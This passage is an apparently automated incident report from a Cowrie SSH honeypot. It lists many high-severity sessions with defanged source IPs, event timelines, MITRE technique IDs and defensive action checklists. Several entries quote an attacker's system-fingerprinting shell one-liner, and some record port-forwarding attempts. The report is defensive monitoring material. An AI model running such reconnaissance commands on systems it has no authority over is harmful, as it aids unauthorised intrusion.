| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.command.input` |
| `2026-07-24 03:36:11` | `cowrie.log.closed` |
| `2026-07-24 03:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428f2819152b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:38 |
| **Last Seen** | 2026-07-24 03:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:38:00` | `cowrie.session.connect` |
| `2026-07-24 03:38:00` | `cowrie.client.version` |
| `2026-07-24 03:38:00` | `cowrie.client.kex` |
| `2026-07-24 03:38:02` | `cowrie.login.success` |
| `2026-07-24 03:38:03` | `cowrie.session.params` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.success` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:03` | `cowrie.command.input` |
| `2026-07-24 03:38:04` | `cowrie.log.closed` |
| `2026-07-24 03:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd239967c61

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-24 03:38 |
| **Last Seen** | 2026-07-24 03:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:38:34` | `cowrie.session.connect` |
| `2026-07-24 03:38:35` | `cowrie.client.version` |
| `2026-07-24 03:38:35` | `cowrie.client.kex` |
| `2026-07-24 03:38:36` | `cowrie.login.success` |
| `2026-07-24 03:38:37` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7df83ee6c74

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:39 |
| **Last Seen** | 2026-07-24 03:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:39:54` | `cowrie.session.connect` |
| `2026-07-24 03:39:55` | `cowrie.client.version` |
| `2026-07-24 03:39:55` | `cowrie.client.kex` |
| `2026-07-24 03:39:56` | `cowrie.login.success` |
| `2026-07-24 03:39:58` | `cowrie.session.params` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.success` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.command.input` |
| `2026-07-24 03:39:58` | `cowrie.log.closed` |
| `2026-07-24 03:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c403315b7ad7

| Field | Detail |
|---|---|
| **Source IP** | `34.140.11[.]164` |
| **First Seen** | 2026-07-24 03:40 |
| **Last Seen** | 2026-07-24 03:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:40:10` | `cowrie.session.connect` |
| `2026-07-24 03:40:10` | `cowrie.client.version` |
| `2026-07-24 03:40:10` | `cowrie.client.kex` |
| `2026-07-24 03:40:13` | `cowrie.login.success` |
| `2026-07-24 03:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.11[.]164` to AbuseIPDB if not already reported
- [ ] Block `34.140.11[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c988a79b444

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:41 |
| **Last Seen** | 2026-07-24 03:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:41:42` | `cowrie.session.connect` |
| `2026-07-24 03:41:42` | `cowrie.client.version` |
| `2026-07-24 03:41:42` | `cowrie.client.kex` |
| `2026-07-24 03:41:45` | `cowrie.login.success` |
| `2026-07-24 03:41:46` | `cowrie.session.params` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.success` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:46` | `cowrie.command.input` |
| `2026-07-24 03:41:47` | `cowrie.log.closed` |
| `2026-07-24 03:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aa0c2b2e7d9

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-07-24 03:43 |
| **Last Seen** | 2026-07-24 03:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:43:09` | `cowrie.session.connect` |
| `2026-07-24 03:43:09` | `cowrie.client.version` |
| `2026-07-24 03:43:09` | `cowrie.client.kex` |
| `2026-07-24 03:43:11` | `cowrie.login.success` |
| `2026-07-24 03:43:12` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-052d58a83489

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:43 |
| **Last Seen** | 2026-07-24 03:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:43:32` | `cowrie.session.connect` |
| `2026-07-24 03:43:32` | `cowrie.client.version` |
| `2026-07-24 03:43:32` | `cowrie.client.kex` |
| `2026-07-24 03:43:34` | `cowrie.login.success` |
| `2026-07-24 03:43:35` | `cowrie.session.params` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.success` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:35` | `cowrie.command.input` |
| `2026-07-24 03:43:36` | `cowrie.log.closed` |
| `2026-07-24 03:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544d527de52f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:45 |
| **Last Seen** | 2026-07-24 03:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:45:25` | `cowrie.session.connect` |
| `2026-07-24 03:45:26` | `cowrie.client.version` |
| `2026-07-24 03:45:26` | `cowrie.client.kex` |
| `2026-07-24 03:45:27` | `cowrie.login.success` |
| `2026-07-24 03:45:29` | `cowrie.session.params` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.success` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.command.input` |
| `2026-07-24 03:45:29` | `cowrie.log.closed` |
| `2026-07-24 03:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce0d4fd5516

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-07-24 03:46 |
| **Last Seen** | 2026-07-24 03:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:46:32` | `cowrie.session.connect` |
| `2026-07-24 03:46:33` | `cowrie.client.version` |
| `2026-07-24 03:46:33` | `cowrie.client.kex` |
| `2026-07-24 03:46:35` | `cowrie.login.success` |
| `2026-07-24 03:46:36` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26d127ee9c9

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-24 03:46 |
| **Last Seen** | 2026-07-24 03:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:46:37` | `cowrie.session.connect` |
| `2026-07-24 03:46:38` | `cowrie.client.version` |
| `2026-07-24 03:46:38` | `cowrie.client.kex` |
| `2026-07-24 03:46:40` | `cowrie.login.success` |
| `2026-07-24 03:46:41` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72fce7572d7b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:47 |
| **Last Seen** | 2026-07-24 03:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:47:26` | `cowrie.session.connect` |
| `2026-07-24 03:47:26` | `cowrie.client.version` |
| `2026-07-24 03:47:26` | `cowrie.client.kex` |
| `2026-07-24 03:47:28` | `cowrie.login.success` |
| `2026-07-24 03:47:29` | `cowrie.session.params` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.success` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:29` | `cowrie.command.input` |
| `2026-07-24 03:47:30` | `cowrie.log.closed` |
| `2026-07-24 03:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e97c45a3a3e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:49 |
| **Last Seen** | 2026-07-24 03:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:49:39` | `cowrie.session.connect` |
| `2026-07-24 03:49:39` | `cowrie.client.version` |
| `2026-07-24 03:49:39` | `cowrie.client.kex` |
| `2026-07-24 03:49:40` | `cowrie.login.success` |
| `2026-07-24 03:49:41` | `cowrie.session.params` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.success` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:41` | `cowrie.command.input` |
| `2026-07-24 03:49:42` | `cowrie.log.closed` |
| `2026-07-24 03:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ed41ae734d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:51 |
| **Last Seen** | 2026-07-24 03:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:51:59` | `cowrie.session.connect` |
| `2026-07-24 03:51:59` | `cowrie.client.version` |
| `2026-07-24 03:51:59` | `cowrie.client.kex` |
| `2026-07-24 03:52:00` | `cowrie.login.success` |
| `2026-07-24 03:52:01` | `cowrie.session.params` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.success` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.command.input` |
| `2026-07-24 03:52:01` | `cowrie.log.closed` |
| `2026-07-24 03:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463003a4816c

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]188` |
| **First Seen** | 2026-07-24 03:53 |
| **Last Seen** | 2026-07-24 03:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:53:29` | `cowrie.session.connect` |
| `2026-07-24 03:53:29` | `cowrie.client.version` |
| `2026-07-24 03:53:29` | `cowrie.client.kex` |
| `2026-07-24 03:53:31` | `cowrie.login.success` |
| `2026-07-24 03:53:31` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]188` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515436588331

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:54 |
| **Last Seen** | 2026-07-24 03:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:54:08` | `cowrie.session.connect` |
| `2026-07-24 03:54:09` | `cowrie.client.version` |
| `2026-07-24 03:54:09` | `cowrie.client.kex` |
| `2026-07-24 03:54:11` | `cowrie.login.success` |
| `2026-07-24 03:54:12` | `cowrie.session.params` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.success` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.command.input` |
| `2026-07-24 03:54:12` | `cowrie.log.closed` |
| `2026-07-24 03:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a04ff8fee5ff

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:55 |
| **Last Seen** | 2026-07-24 03:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
